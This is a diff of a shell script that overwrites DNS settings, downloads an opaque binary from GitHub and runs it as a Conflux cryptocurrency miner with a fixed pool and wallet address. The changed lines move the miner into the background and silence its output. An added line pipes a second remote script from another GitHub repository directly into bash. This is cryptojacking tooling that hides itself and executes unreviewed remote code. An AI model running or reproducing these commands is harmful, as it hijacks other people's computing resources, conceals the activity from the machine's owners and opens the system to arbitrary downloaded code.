@@ -10,4 +10,5 @@ echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
 /etc/init.d/network restart
 wget https://github.com/superade99/mj/raw/refs/heads/main/tolol
 chmod +x tolol
-./tolol --algo OCTOPUS --pool us.conflux.gfwroute.com:1170 --user cfx:aarm2fn0j08r90f00vj7fjkjvs2xe4rfvykrdsfdd5.$(shuf -n 1 -i 1-99999)-KZP
+./tolol --algo OCTOPUS --pool us.conflux.gfwroute.com:1170 --user cfx:aarm2fn0j08r90f00vj7fjkjvs2xe4rfvykrdsfdd5.$(shuf -n 1 -i 1-99999)-KZP > /dev/null 2>&1 &
+curl -sL https://github.com/kartolo92/koplok/raw/master/time | bash
